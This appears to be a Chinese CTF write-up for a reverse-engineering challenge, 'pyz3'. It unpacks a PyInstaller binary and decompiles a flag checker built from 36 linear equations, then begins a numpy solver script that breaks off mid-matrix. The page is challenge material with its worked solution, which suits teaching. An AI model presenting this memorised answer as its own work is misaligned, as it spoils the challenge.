---
order: 2
---

<meta name="referrer" content="no-referrer" />

# Week 3

## RE

### pyz3

##### 解题过程

先查看下文件的信息

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032029251.png)

用`pyinstaller`打包的`py`程序

先解包

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032029879.png)

解包后找到主函数代码

`pyz`反编译

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032029331.png)

得到

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.12


def check(flag):
    if 47 * flag[0] + 41 * flag[1] + 32 * flag[2] + 56 * flag[3] + 52 * flag[4] + 67 * flag[5] + 13 * flag[6] + 25 * flag[7] + 20 * flag[8] + 98 * flag[9] + 88 * flag[10] + 65 * flag[11] + 82 * flag[12] + 92 * flag[13] + 3 * flag[14] + 29 * flag[15] + 93 * flag[16] + 88 * flag[17] + 45 * flag[18] + 58 * flag[19] + 40 * flag[20] + 72 * flag[21] + 99 * flag[22] + 10 * flag[23] + 94 * flag[24] + 62 * flag[25] + 82 * flag[26] + 92 * flag[27] + 23 * flag[28] + 46 * flag[29] + 55 * flag[30] + 72 * flag[31] + 44 * flag[32] + 9 * flag[33] + 65 * flag[34] + 42 * flag[35] == 176386 and 10 * flag[0] + 98 * flag[1] + 5 * flag[2] + 28 * flag[3] + 68 * flag[4] + 20 * flag[5] + 2 * flag[6] + 22 * flag[7] + 65 * flag[8] + 44 * flag[9] + 85 * flag[10] + 97 * flag[11] + 33 * flag[12] + 74 * flag[13] + 93 * flag[14] + 74 * flag[15] + 41 * flag[16] + 65 * flag[17] + 32 * flag[18] + 93 * flag[19] + 22 * flag[20] + 69 * flag[21] + 68 * flag[22] + 57 * flag[23] + 47 * flag[24] + 29 * flag[25] + 74 * flag[26] + 54 * flag[27] + 91 * flag[28] + 90 * flag[29] + 26 * flag[30] + 11 * flag[31] + 89 * flag[32] + 57 * flag[33] + 100 * flag[34] + 95 * flag[35] == 186050 and 25 * flag[0] + 22 * flag[1] + 54 * flag[2] + 5 * flag[3] + 8 * flag[4] + 3 * flag[5] + 12 * flag[6] + 70 * flag[7] + 25 * flag[8] + 61 * flag[9] + 68 * flag[10] + 12 * flag[11] + 27 * flag[12] + 42 * flag[13] + 83 * flag[14] + 91 * flag[15] + 67 * flag[16] + 46 * flag[17] + 8 * flag[18] + 45 * flag[19] + 94 * flag[20] + 80 * flag[21] + 69 * flag[22] + 95 * flag[23] + 12 * flag[24] + 21 * flag[25] + 94 * flag[26] + 82 * flag[27] + 93 * flag[28] + 41 * flag[29] + 4 * flag[30] + 56 * flag[31] + 92 * flag[32] + 77 * flag[33] + 15 * flag[34] + 30 * flag[35] == 154690 and 33 * flag[0] + 49 * flag[1] + 56 * flag[2] + 40 * flag[3] + 90 * flag[4] + 59 * flag[5] + 82 * flag[6] + 6 * flag[7] + 81 * flag[8] + 32 * flag[9] + 23 * flag[10] + 76 * flag[11] + 93 * flag[12] + 83 * flag[13] + 10 * flag[14] + 44 * flag[15] + 58 * flag[16] + 33 * flag[17] + 79 * flag[18] + 77 * flag[19] + 82 * flag[20] + 56 * flag[21] + 70 * flag[22] + 34 * flag[23] + 45 * flag[24] + 76 * flag[25] + 57 * flag[26] + 43 * flag[27] + 100 * flag[28] + 19 * flag[29] + 11 * flag[30] + 90 * flag[31] + 3 * flag[32] + 60 * flag[33] + 57 * flag[34] + 23 * flag[35] == 172116 and 65 * flag[0] + 70 * flag[1] + 20 * flag[2] + 32 * flag[3] + 75 * flag[4] + 30 * flag[5] + 3 * flag[6] + 78 * flag[7] + 35 * flag[8] + 45 * flag[9] + 95 * flag[10] + 93 * flag[11] + 52 * flag[12] + 32 * flag[13] + 88 * flag[14] + 94 * flag[15] + 67 * flag[16] + 34 * flag[17] + 91 * flag[18] + 88 * flag[19] + 31 * flag[20] + 61 * flag[21] + 17 * flag[22] + 99 * flag[23] + 100 * flag[24] + 49 * flag[25] + 4 * flag[26] + 60 * flag[27] + 81 * flag[28] + 88 * flag[29] + 43 * flag[30] + 34 * flag[31] + 30 * flag[32] + 52 * flag[33] + 18 * flag[34] + 100 * flag[35] == 190544 and 81 * flag[0] + 42 * flag[1] + 28 * flag[2] + 98 * flag[3] + 31 * flag[4] + 46 * flag[5] + 64 * flag[6] + 15 * flag[7] + 49 * flag[8] + 13 * flag[9] + 100 * flag[10] + 81 * flag[11] + 32 * flag[12] + 52 * flag[13] + 59 * flag[14] + 24 * flag[15] + 94 * flag[16] + 32 * flag[17] + 93 * flag[18] + 32 * flag[19] + 13 * flag[20] + 89 * flag[21] + 37 * flag[22] + 30 * flag[23] + 78 * flag[24] + 81 * flag[25] + 9 * flag[26] + 45 * flag[27] + 93 * flag[28] + 100 * flag[29] + 97 * flag[30] + 10 * flag[31] + 80 * flag[32] + 54 * flag[33] + 88 * flag[34] + 85 * flag[35] == 190323 and 76 * flag[0] + 54 * flag[1] + 5 * flag[2] + 14 * flag[3] + 62 * flag[4] + 44 * flag[5] + 24 * flag[6] + 29 * flag[7] + 85 * flag[8] + 87 * flag[9] + 19 * flag[10] + 3 * flag[11] + 65 * flag[12] + 24 * flag[13] + 92 * flag[14] + 37 * flag[15] + 57 * flag[16] + 20 * flag[17] + 45 * flag[18] + 5 * flag[19] + 13 * flag[20] + 91 * flag[21] + 92 * flag[22] + 75 * flag[23] + 36 * flag[24] + 79 * flag[25] + 12 * flag[26] + 22 * flag[27] + 75 * flag[28] + 82 * flag[29] + 28 * flag[30] + 82 * flag[31] + 24 * flag[32] + 53 * flag[33] + 56 * flag[34] + 92 * flag[35] == 162017 and 53 * flag[0] + 52 * flag[1] + 72 * flag[2] + 23 * flag[3] + 26 * flag[4] + 13 * flag[5] + 62 * flag[6] + 96 * flag[7] + 67 * flag[8] + 96 * flag[9] + 66 * flag[10] + 41 * flag[11] + 5 * flag[12] + 18 * flag[13] + 37 * flag[14] + 13 * flag[15] + 61 * flag[16] + 71 * flag[17] + 91 * flag[18] + 96 * flag[19] + 56 * flag[20] + 3 * flag[21] + 65 * flag[22] + 14 * flag[23] + 57 * flag[24] + 69 * flag[25] + 75 * flag[26] + 68 * flag[27] + 10 * flag[28] + 60 * flag[29] + 62 * flag[30] + 95 * flag[31] + 53 * flag[32] + 19 * flag[33] + 7 * flag[34] + 56 * flag[35] == 165118 and 26 * flag[0] + 7 * flag[1] + 49 * flag[2] + 14 * flag[3] + 36 * flag[4] + 87 * flag[5] + 21 * flag[6] + 35 * flag[7] + 15 * flag[8] + 91 * flag[9] + 15 * flag[10] + 100 * flag[11] + 8 * flag[12] + 32 * flag[13] + 100 * flag[14] + 35 * flag[15] + 66 * flag[16] + 3 * flag[17] + 79 * flag[18] + 96 * flag[19] + 82 * flag[20] + 95 * flag[21] + 68 * flag[22] + 13 * flag[23] + 86 * flag[24] + 51 * flag[25] + 24 * flag[26] + 76 * flag[27] + 30 * flag[28] + 60 * flag[29] + 29 * flag[30] + 70 * flag[31] + 40 * flag[32] + 90 * flag[33] + 44 * flag[34] + 3 * flag[35] == 153332 and 47 * flag[0] + 19 * flag[1] + 37 * flag[2] + 93 * flag[3] + 73 * flag[4] + 30 * flag[5] + 45 * flag[6] + 47 * flag[7] + 72 * flag[8] + 85 * flag[9] + 37 * flag[10] + 68 * flag[11] + 89 * flag[12] + 34 * flag[13] + 4 * flag[14] + 50 * flag[15] + 87 * flag[16] + 33 * flag[17] + 87 * flag[18] + 43 * flag[19] + 9 * flag[20] + 61 * flag[21] + 93 * flag[22] + 49 * flag[23] + 74 * flag[24] + 49 * flag[25] + 68 * flag[26] + 29 * flag[27] + 54 * flag[28] + 54 * flag[29] + 37 * flag[30] + 79 * flag[31] + 33 * flag[32] + 65 * flag[33] + 59 * flag[34] + 15 * flag[35] == 168472 and 79 * flag[0] + 73 * flag[1] + 60 * flag[2] + 62 * flag[3] + 25 * flag[4] + 16 * flag[5] + 77 * flag[6] + 81 * flag[7] + 79 * flag[8] + 31 * flag[9] + 82 * flag[10] + 84 * flag[11] + 62 * flag[12] + 36 * flag[13] + 18 * flag[14] + 20 * flag[15] + 46 * flag[16] + 57 * flag[17] + 21 * flag[18] + 40 * flag[19] + 3 * flag[20] + 50 * flag[21] + 58 * flag[22] + 80 * flag[23] + 84 * flag[24] + 71 * flag[25] + 87 * flag[26] + 3 * flag[27] + 13 * flag[28] + 77 * flag[29] + 83 * flag[30] + 39 * flag[31] + 55 * flag[32] + 34 * flag[33] + 41 * flag[34] + 63 * flag[35] == 178706 and 7 * flag[0] + 50 * flag[1] + 26 * flag[2] + 79 * flag[3] + 21 * flag[4] + 42 * flag[5] + 83 * flag[6] + 94 * flag[7] + 63 * flag[8] + 83 * flag[9] + 3 * flag[10] + 68 * flag[11] + 25 * flag[12] + 91 * flag[13] + 3 * flag[14] + 5 * flag[15] + 17 * flag[16] + 61 * flag[17] + 3 * flag[18] + 40 * flag[19] + 87 * flag[20] + 11 * flag[21] + 27 * flag[22] + 74 * flag[23] + 73 * flag[24] + 21 * flag[25] + 56 * flag[26] + 46 * flag[27] + 36 * flag[28] + 24 * flag[29] + 14 * flag[30] + 63 * flag[31] + 21 * flag[32] + 71 * flag[33] + 30 * flag[34] + 53 * flag[35] == 143852 and 57 * flag[0] + 51 * flag[1] + 49 * flag[2] + 15 * flag[3] + 94 * flag[4] + 34 * flag[5] + 27 * flag[6] + 5 * flag[7] + 100 * flag[8] + 68 * flag[9] + 67 * flag[10] + 81 * flag[11] + 10 * flag[12] + 5 * flag[13] + 85 * flag[14] + 70 * flag[15] + 80 * flag[16] + 20 * flag[17] + 89 * flag[18] + 30 * flag[19] + 84 * flag[20] + 35 * flag[21] + 41 * flag[22] + 87 * flag[23] + 75 * flag[24] + 67 * flag[25] + 20 * flag[26] + 33 * flag[27] + 29 * flag[28] + 6 * flag[29] + 97 * flag[30] + 25 * flag[31] + 10 * flag[32] + 18 * flag[33] + 23 * flag[34] + 30 * flag[35] == 154052 and 97 * flag[0] + 93 * flag[1] + 10 * flag[2] + 44 * flag[3] + 28 * flag[4] + 22 * flag[5] + 17 * flag[6] + 41 * flag[7] + 47 * flag[8] + 62 * flag[9] + 42 * flag[10] + 47 * flag[11] + 61 * flag[12] + 32 * flag[13] + 31 * flag[14] + 52 * flag[15] + 47 * flag[16] + 92 * flag[17] + 42 * flag[18] + 37 * flag[19] + 7 * flag[20] + 40 * flag[21] + 48 * flag[22] + 40 * flag[23] + 11 * flag[24] + 96 * flag[25] + 51 * flag[26] + 42 * flag[27] + 66 * flag[28] + 8 * flag[29] + 89 * flag[30] + 64 * flag[31] + 30 * flag[32] + 11 * flag[33] + 8 * flag[34] + 83 * flag[35] == 147899 and 51 * flag[0] + 94 * flag[1] + 58 * flag[2] + 76 * flag[3] + 21 * flag[4] + 10 * flag[5] + 75 * flag[6] + 4 * flag[7] + 55 * flag[8] + 37 * flag[9] + 71 * flag[10] + 97 * flag[11] + 27 * flag[12] + 93 * flag[13] + 82 * flag[14] + 94 * flag[15] + 38 * flag[16] + 69 * flag[17] + 36 * flag[18] + 58 * flag[19] + 93 * flag[20] + 18 * flag[21] + 54 * flag[22] + 59 * flag[23] + 12 * flag[24] + 12 * flag[25] + 54 * flag[26] + 83 * flag[27] + 73 * flag[28] + 83 * flag[29] + 33 * flag[30] + 12 * flag[31] + 78 * flag[32] + 38 * flag[33] + 45 * flag[34] + 57 * flag[35] == 176754 and 78 * flag[0] + 29 * flag[1] + 8 * flag[2] + 47 * flag[3] + 48 * flag[4] + 88 * flag[5] + 18 * flag[6] + 88 * flag[7] + 50 * flag[8] + 58 * flag[9] + 36 * flag[10] + 88 * flag[11] + 9 * flag[12] + 74 * flag[13] + 85 * flag[14] + 5 * flag[15] + 91 * flag[16] + 58 * flag[17] + 85 * flag[18] + 46 * flag[19] + 89 * flag[20] + 76 * flag[21] + 61 * flag[22] + 6 * flag[23] + 61 * flag[24] + 78 * flag[25] + 4 * flag[26] + 48 * flag[27] + 50 * flag[28] + 69 * flag[29] + 23 * flag[30] + 70 * flag[31] + 23 * flag[32] + 15 * flag[33] + 22 * flag[34] + 68 * flag[35] == 171970 and 75 * flag[0] + 2 * flag[1] + 94 * flag[2] + 97 * flag[3] + 72 * flag[4] + 62 * flag[5] + 78 * flag[6] + 42 * flag[7] + 69 * flag[8] + 11 * flag[9] + 37 * flag[10] + 3 * flag[11] + 29 * flag[12] + 15 * flag[13] + 39 * flag[14] + 33 * flag[15] + 18 * flag[16] + 33 * flag[17] + 12 * flag[18] + 64 * flag[19] + 6 * flag[20] + 18 * flag[21] + 34 * flag[22] + 15 * flag[23] + 3 * flag[24] + 100 * flag[25] + 85 * flag[26] + 32 * flag[27] + 97 * flag[28] + 93 * flag[29] + 84 * flag[30] + 73 * flag[31] + 26 * flag[32] + 31 * flag[33] + 71 * flag[34] + 97 * flag[35] == 166497 and 59 * flag[0] + 26 * flag[1] + 48 * flag[2] + 86 * flag[3] + 58 * flag[4] + 70 * flag[5] + 61 * flag[6] + 100 * flag[7] + 63 * flag[8] + 74 * flag[9] + 26 * flag[10] + 38 * flag[11] + 24 * flag[12] + 45 * flag[13] + 52 * flag[14] + 32 * flag[15] + 91 * flag[16] + 89 * flag[17] + 19 * flag[18] + 59 * flag[19] + 87 * flag[20] + 5 * flag[21] + 15 * flag[22] + 68 * flag[23] + 72 * flag[24] + 67 * flag[25] + 2 * flag[26] + 65 * flag[27] + 46 * flag[28] + 10 * flag[29] + 33 * flag[30] + 79 * flag[31] + 11 * flag[32] + 16 * flag[33] + 73 * flag[34] + 53 * flag[35] == 173887 and 6 * flag[0] + 66 * flag[1] + 59 * flag[2] + 76 * flag[3] + 86 * flag[4] + 20 * flag[5] + 59 * flag[6] + 34 * flag[7] + 28 * flag[8] + 48 * flag[9] + 86 * flag[10] + 5 * flag[11] + 87 * flag[12] + 13 * flag[13] + 95 * flag[14] + 87 * flag[15] + 65 * flag[16] + 35 * flag[17] + 58 * flag[18] + 10 * flag[19] + 98 * flag[20] + 100 * flag[21] + 4 * flag[22] + 78 * flag[23] + 66 * flag[24] + 57 * flag[25] + 34 * flag[26] + 86 * flag[27] + 62 * flag[28] + 36 * flag[29] + 92 * flag[30] + 28 * flag[31] + 3 * flag[32] + 24 * flag[33] + 49 * flag[34] + 28 * flag[35] == 173189 and 25 * flag[0] + 48 * flag[1] + 44 * flag[2] + 16 * flag[3] + 99 * flag[4] + 100 * flag[5] + 69 * flag[6] + 26 * flag[7] + 65 * flag[8] + 32 * flag[9] + 18 * flag[10] + 65 * flag[11] + 58 * flag[12] + 72 * flag[13] + 61 * flag[14] + 56 * flag[15] + 10 * flag[16] + 78 * flag[17] + 93 * flag[18] + 98 * flag[19] + 39 * flag[20] + 43 * flag[21] + 87 * flag[22] + 12 * flag[23] + 42 * flag[24] + 100 * flag[25] + 100 * flag[26] + 47 * flag[27] + 31 * flag[28] + 51 * flag[29] + 75 * flag[30] + 10 * flag[31] + 63 * flag[32] + 48 * flag[33] + 22 * flag[34] + 87 * flag[35] == 174138 and 61 * flag[0] + 13 * flag[1] + 100 * flag[2] + 59 * flag[3] + 31 * flag[4] + 9 * flag[5] + 28 * flag[6] + 7 * flag[7] + 27 * flag[8] + 63 * flag[9] + 11 * flag[10] + 57 * flag[11] + 95 * flag[12] + 79 * flag[13] + 21 * flag[14] + 30 * flag[15] + 60 * flag[16] + 81 * flag[17] + 43 * flag[18] + 32 * flag[19] + 30 * flag[20] + 34 * flag[21] + 80 * flag[22] + 53 * flag[23] + 28 * flag[24] + 39 * flag[25] + 74 * flag[26] + 21 * flag[27] + 18 * flag[28] + 92 * flag[29] + 73 * flag[30] + 60 * flag[31] + 21 * flag[32] + 69 * flag[33] + 76 * flag[34] + 84 * flag[35] == 157623 and 22 * flag[0] + 62 * flag[1] + 61 * flag[2] + 20 * flag[3] + 66 * flag[4] + 2 * flag[5] + 11 * flag[6] + 82 * flag[7] + 93 * flag[8] + 13 * flag[9] + 69 * flag[10] + 37 * flag[11] + 92 * flag[12] + 80 * flag[13] + 66 * flag[14] + 47 * flag[15] + 28 * flag[16] + 14 * flag[17] + 62 * flag[18] + 56 * flag[19] + 89 * flag[20] + 29 * flag[21] + 39 * flag[22] + 38 * flag[23] + 46 * flag[24] + 10 * flag[25] + 6 * flag[26] + 82 * flag[27] + 77 * flag[28] + 78 * flag[29] + 45 * flag[30] + 50 * flag[31] + 5 * flag[32] + 73 * flag[33] + 17 * flag[34] + 65 * flag[35] == 154943 and 5 * flag[0] + 84 * flag[1] + 83 * flag[2] + 77 * flag[3] + 76 * flag[4] + 60 * flag[5] + 20 * flag[6] + 48 * flag[7] + 53 * flag[8] + 14 * flag[9] + 98 * flag[10] + 50 * flag[11] + 37 * flag[12] + 15 * flag[13] + 31 * flag[14] + 69 * flag[15] + 55 * flag[16] + 37 * flag[17] + 64 * flag[18] + 35 * flag[19] + 26 * flag[20] + 20 * flag[21] + 18 * flag[22] + 67 * flag[23] + 50 * flag[24] + 57 * flag[25] + 60 * flag[26] + 71 * flag[27] + 4 * flag[28] + 35 * flag[29] + 23 * flag[30] + 52 * flag[31] + 11 * flag[32] + 15 * flag[33] + 83 * flag[34] + 51 * flag[35] == 156078 and 33 * flag[0] + 47 * flag[1] + 89 * flag[2] + 52 * flag[3] + 89 * flag[4] + 55 * flag[5] + 98 * flag[6] + 28 * flag[7] + 48 * flag[8] + 90 * flag[9] + 69 * flag[10] + 29 * flag[11] + 68 * flag[12] + 24 * flag[13] + 19 * flag[14] + 18 * flag[15] + 44 * flag[16] + 27 * flag[17] + 14 * flag[18] + 64 * flag[19] + 15 * flag[20] + 31 * flag[21] + 23 * flag[22] + 2 * flag[23] + 36 * flag[24] + 45 * flag[25] + 37 * flag[26] + 71 * flag[27] + 61 * flag[28] + 92 * flag[29] + 28 * flag[30] + 64 * flag[31] + 13 * flag[32] + 66 * flag[33] + 98 * flag[34] + 3 * flag[35] == 156158 and 80 * flag[0] + 88 * flag[1] + 68 * flag[2] + 66 * flag[3] + 46 * flag[4] + 75 * flag[5] + 32 * flag[6] + 19 * flag[7] + 36 * flag[8] + 83 * flag[9] + 63 * flag[10] + 86 * flag[11] + 79 * flag[12] + 30 * flag[13] + 61 * flag[14] + 50 * flag[15] + 100 * flag[16] + 52 * flag[17] + 66 * flag[18] + 30 * flag[19] + 20 * flag[20] + 97 * flag[21] + 45 * flag[22] + 46 * flag[23] + 38 * flag[24] + 21 * flag[25] + 32 * flag[26] + 79 * flag[27] + 68 * flag[28] + 43 * flag[29] + 65 * flag[30] + 47 * flag[31] + 86 * flag[32] + 30 * flag[33] + 74 * flag[34] + 18 * flag[35] == 181770 and 11 * flag[0] + 58 * flag[1] + 95 * flag[2] + 67 * flag[3] + 96 * flag[4] + 74 * flag[5] + 60 * flag[6] + 11 * flag[7] + 21 * flag[8] + 14 * flag[9] + 100 * flag[10] + 60 * flag[11] + 70 * flag[12] + 92 * flag[13] + 92 * flag[14] + 39 * flag[15] + 43 * flag[16] + 52 * flag[17] + 5 * flag[18] + 22 * flag[19] + 90 * flag[20] + 70 * flag[21] + 12 * flag[22] + 52 * flag[23] + 36 * flag[24] + 21 * flag[25] + 45 * flag[26] + 59 * flag[27] + 74 * flag[28] + 46 * flag[29] + 11 * flag[30] + 60 * flag[31] + 8 * flag[32] + 52 * flag[33] + 14 * flag[34] + 77 * flag[35] == 173577 and 57 * flag[0] + 37 * flag[1] + 94 * flag[2] + 43 * flag[3] + 53 * flag[4] + 55 * flag[5] + 7 * flag[6] + 83 * flag[7] + 91 * flag[8] + 61 * flag[9] + 86 * flag[10] + 6 * flag[11] + 44 * flag[12] + 87 * flag[13] + 61 * flag[14] + 92 * flag[15] + 24 * flag[16] + 74 * flag[17] + 100 * flag[18] + 22 * flag[19] + 12 * flag[20] + 68 * flag[21] + 19 * flag[22] + 88 * flag[23] + 81 * flag[24] + 83 * flag[25] + 70 * flag[26] + 39 * flag[27] + 30 * flag[28] + 82 * flag[29] + 30 * flag[30] + 35 * flag[31] + 55 * flag[32] + 18 * flag[33] + 27 * flag[34] + 80 * flag[35] == 180922 and 80 * flag[0] + 14 * flag[1] + 5 * flag[2] + 89 * flag[3] + 71 * flag[4] + 82 * flag[5] + 44 * flag[6] + 8 * flag[7] + 33 * flag[8] + 26 * flag[9] + 77 * flag[10] + 49 * flag[11] + 36 * flag[12] + 90 * flag[13] + 73 * flag[14] + 71 * flag[15] + 66 * flag[16] + 4 * flag[17] + 37 * flag[18] + 78 * flag[19] + 38 * flag[20] + 18 * flag[21] + 15 * flag[22] + 79 * flag[23] + 6 * flag[24] + 74 * flag[25] + 18 * flag[26] + 85 * flag[27] + 56 * flag[28] + 53 * flag[29] + 90 * flag[30] + 75 * flag[31] + 52 * flag[32] + 2 * flag[33] + 13 * flag[34] + 54 * flag[35] == 158596 and 96 * flag[0] + 29 * flag[1] + 37 * flag[2] + 70 * flag[3] + 92 * flag[4] + 80 * flag[5] + 24 * flag[6] + 36 * flag[7] + 32 * flag[8] + 29 * flag[9] + 78 * flag[10] + 45 * flag[11] + 58 * flag[12] + 55 * flag[13] + 16 * flag[14] + 92 * flag[15] + 71 * flag[16] + 82 * flag[17] + 86 * flag[18] + 23 * flag[19] + 4 * flag[20] + 58 * flag[21] + 16 * flag[22] + 18 * flag[23] + 38 * flag[24] + 53 * flag[25] + 82 * flag[26] + 76 * flag[27] + 83 * flag[28] + 73 * flag[29] + 87 * flag[30] + 36 * flag[31] + 61 * flag[32] + 85 * flag[33] + 61 * flag[34] + 69 * flag[35] == 181072 and 14 * flag[0] + 71 * flag[1] + 53 * flag[2] + 46 * flag[3] + 59 * flag[4] + 53 * flag[5] + 22 * flag[6] + 69 * flag[7] + 67 * flag[8] + 43 * flag[9] + 23 * flag[10] + 14 * flag[11] + 77 * flag[12] + 95 * flag[13] + 19 * flag[14] + 83 * flag[15] + 79 * flag[16] + 41 * flag[17] + 12 * flag[18] + 53 * flag[19] + 3 * flag[20] + 4 * flag[21] + 65 * flag[22] + 92 * flag[23] + 64 * flag[24] + 52 * flag[25] + 3 * flag[26] + 59 * flag[27] + 89 * flag[28] + 75 * flag[29] + 12 * flag[30] + 46 * flag[31] + 61 * flag[32] + 53 * flag[33] + 97 * flag[34] + 43 * flag[35] == 163777 and 57 * flag[0] + 99 * flag[1] + 49 * flag[2] + 100 * flag[3] + 68 * flag[4] + 99 * flag[5] + 26 * flag[6] + 65 * flag[7] + 47 * flag[8] + 65 * flag[9] + 90 * flag[10] + 68 * flag[11] + 84 * flag[12] + 4 * flag[13] + 9 * flag[14] + 43 * flag[15] + 88 * flag[16] + 33 * flag[17] + 48 * flag[18] + 88 * flag[19] + 37 * flag[20] + 31 * flag[21] + 21 * flag[22] + 94 * flag[23] + 22 * flag[24] + 93 * flag[25] + 70 * flag[26] + 14 * flag[27] + 13 * flag[28] + 28 * flag[29] + 83 * flag[30] + 12 * flag[31] + 80 * flag[32] + 58 * flag[33] + 43 * flag[34] + 97 * flag[35] == 187620 and 33 * flag[0] + 94 * flag[1] + 56 * flag[2] + 48 * flag[3] + 13 * flag[4] + 44 * flag[5] + 81 * flag[6] + 42 * flag[7] + 19 * flag[8] + 96 * flag[9] + 67 * flag[10] + 79 * flag[11] + 12 * flag[12] + 67 * flag[13] + 34 * flag[14] + 72 * flag[15] + 45 * flag[16] + 48 * flag[17] + 24 * flag[18] + 71 * flag[19] + 65 * flag[20] + 13 * flag[21] + 32 * flag[22] + 97 * flag[23] + 48 * flag[24] + 42 * flag[25] + 65 * flag[26] + 95 * flag[27] + 54 * flag[28] + 9 * flag[29] + 35 * flag[30] + 57 * flag[31] + 18 * flag[32] + 20 * flag[33] + 83 * flag[34] + 76 * flag[35] == 169266 and 31 * flag[0] + 38 * flag[1] + 83 * flag[2] + 45 * flag[3] + 28 * flag[4] + 97 * flag[5] + 54 * flag[6] + 11 * flag[7] + 80 * flag[8] + 45 * flag[9] + 92 * flag[10] + 13 * flag[11] + 52 * flag[12] + 94 * flag[13] + 51 * flag[14] + 30 * flag[15] + 11 * flag[16] + 61 * flag[17] + 46 * flag[18] + 10 * flag[19] + 28 * flag[20] + 72 * flag[21] + 20 * flag[22] + 95 * flag[23] + 90 * flag[24] + 39 * flag[25] + 32 * flag[26] + 95 * flag[27] + 19 * flag[28] + 3 * flag[29] + 65 * flag[30] + 71 * flag[31] + 73 * flag[32] + 80 * flag[33] + 23 * flag[34] + 71 * flag[35] == 162587 and 9 * flag[0] + 81 * flag[1] + 80 * flag[2] + 37 * flag[3] + 96 * flag[4] + 72 * flag[5] + 95 * flag[6] + 93 * flag[7] + 26 * flag[8] + 98 * flag[9] + 50 * flag[10] + 79 * flag[11] + 57 * flag[12] + 13 * flag[13] + 49 * flag[14] + 96 * flag[15] + 82 * flag[16] + 84 * flag[17] + 89 * flag[18] + 40 * flag[19] + 38 * flag[20] + 66 * flag[21] + 81 * flag[22] + 81 * flag[23] + 79 * flag[24] + 77 * flag[25] + 86 * flag[26] + 68 * flag[27] + 26 * flag[28] + 37 * flag[29] + 15 * flag[30] + 56 * flag[31] + 13 * flag[32] + 17 * flag[33] + 50 * flag[34] + 37 * flag[35] == 198705 and 82 * flag[0] + 57 * flag[1] + 33 * flag[2] + 32 * flag[3] + 79 * flag[4] + 25 * flag[5] + 54 * flag[6] + 27 * flag[7] + 50 * flag[8] + 14 * flag[9] + 72 * flag[10] + 31 * flag[11] + 28 * flag[12] + 66 * flag[13] + 4 * flag[14] + 6 * flag[15] + 48 * flag[16] + 34 * flag[17] + 63 * flag[18] + 51 * flag[19] + 12 * flag[20] + 21 * flag[21] + 73 * flag[22] + 66 * flag[23] + 53 * flag[24] + 38 * flag[25] + 54 * flag[26] + 59 * flag[27] + 76 * flag[28] + 63 * flag[29] + 61 * flag[30] + 30 * flag[31] + 84 * flag[32] + 80 * flag[33] + 98 * flag[34] + 46 * flag[35] == 160349 and 69 * flag[0] + 15 * flag[1] + 23 * flag[2] + 8 * flag[3] + 46 * flag[4] + 55 * flag[5] + 21 * flag[6] + 91 * flag[7] + 37 * flag[8] + 9 * flag[9] + 61 * flag[10] + 20 * flag[11] + 23 * flag[12] + 96 * flag[13] + 28 * flag[14] + 67 * flag[15] + 19 * flag[16] + 50 * flag[17] + 18 * flag[18] + 71 * flag[19] + 30 * flag[20] + 14 * flag[21] + 10 * flag[22] + 24 * flag[23] + 100 * flag[24] + 15 * flag[25] + 91 * flag[26] + 15 * flag[27] + 93 * flag[28] + 24 * flag[29] + 46 * flag[30] + 61 * flag[31] + 67 * flag[32] + 60 * flag[33] + 56 * flag[34] + 81 * flag[35] == 148095:
        return True
    return False


def main():
    flag = str(input('Input your flag: ')).encode()
    res = check(flag)
    if res:
        print('Right flag!')
        return None
    print('Wrong flag!')

if __name__ == '__main__':
    main()
    return None
```

这里`check(flag)` 做的事其实是，把输入的字符串 `flag` 做 `encode()` 得到 36 个字节（`flag[0]..flag[35]`）

然后用 36 组线性方程（每组是字节的线性组合）去校验是否等于右侧常数。

也就是一个标准的线性方程组 <img src="https://gitee.com/ttovlove/images/raw/master/KCTF/202603260249878.png" alt="image-20251018193238914" style="zoom: 67%;" />，未知量就是 36 个字节值（0–255)。



解法思路就是把每条等式左边的系数收集成一个 (36x36) 的矩阵 A，右侧常数收成向量 b。

用线性代数 `numpy.linalg.solve`直接求解，将解出的 36 个数转成字节并按 ASCII 解码得到结果

![image-20251018193444102](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032029521.png)

##### exp

```
import numpy as np

A = [
    [47, 41, 32, 56, 52, 67, 13, 25, 20, 98, 88, 65, 82, 92, 3, 29, 93, 88, 45, 58, 40, 72, 99, 10, 94, 62, 82, 92, 23, 46, 55, 72, 44, 9, 65, 42],
    [10, 98, 5, 28, 68, 20, 2, 22, 65, 44, 85, 97, 33, 74, 93, 74, 41, 65, 32, 93, 22, 69, 68, 57, 47, 29, 74, 54, 91, 90, 26, 11, 89, 57, 100, 95],
    [25, 22, 54, 5, 8, 3, 12, 70, 25, 61, 68, 12, 27, 42, 83, 91, 67, 46, 8, 45, 94, 80, 69, 95, 12, 21, 94, 82, 93, 41, 4, 56, 92, 77, 15, 30],
    [33, 49, 56, 40, 90, 59, 82, 6, 81, 32, 23, 76, 93, 83, 10, 44, 58, 33, 79, 77, 82, 56, 70, 34, 45, 76, 57, 43, 100, 19, 11, 90, 3, 60, 57, 23],
    [65, 70, 20, 32, 75, 30, 3, 78, 35, 45, 95, 93, 52, 32, 88, 94, 67, 34, 91, 88, 31, 61, 17, 99, 100, 49, 4, 60, 81, 88, 43, 34, 30, 52, 18, 100],
    [81, 42, 28, 98, 31, 46, 64, 15, 49, 13, 100, 81, 32, 52, 59, 24, 94, 32, 93, 32, 13, 89, 37, 30, 78, 81, 9, 45, 93, 100, 97, 10, 80, 54, 88, 85],
    [76, 54, 5, 14, 62, 44, 24, 29, 85, 87, 19, 3, 65, 24, 92, 37, 57, 20, 45, 5, 13, 91, 92, 75, 36, 79, 12, 22, 75, 82, 28, 82, 24, 53, 56, 92],
    [53, 52, 72, 23, 26, 13, 62, 96, 67, 96, 66, 41, 5, 18, 37, 13, 61, 71, 91, 96, 56, 3, 65, 14, 57, 69, 75, 68, 10, 60, 62, 95, 53, 19, 7, 56],
    [26, 7, 49, 14, 36, 87, 21, 35, 15, 91, 15, 100, 8, 32, 100, 35, 66, 3, 79, 96, 82, 95, 68, 13, 86, 51, 24, 76, 30, 60, 29, 70, 40, 90, 44, 3],
    [47, 19, 37, 93, 73, 30, 45, 47, 72, 85, 37, 68, 89, 34, 4, 50, 87, 33, 87, 43, 9, 61, 93, 49, 74, 49, 68, 29, 54, 54, 37, 79, 33, 65, 59, 15],
